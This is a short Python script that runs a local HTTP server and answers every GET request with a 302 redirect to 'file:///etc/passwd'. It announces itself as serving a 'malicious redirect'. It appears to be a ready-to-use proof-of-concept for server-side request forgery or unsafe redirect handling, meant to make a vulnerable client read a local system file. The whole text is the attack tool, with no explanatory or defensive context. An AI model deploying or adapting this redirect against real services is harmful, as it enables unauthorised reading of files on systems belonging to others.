from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'file:///etc/passwd')
        self.end_headers()

server = HTTPServer(('localhost', 8000), RedirectHandler)
print("Serving malicious redirect on http://localhost:8000")
server.serve_forever()
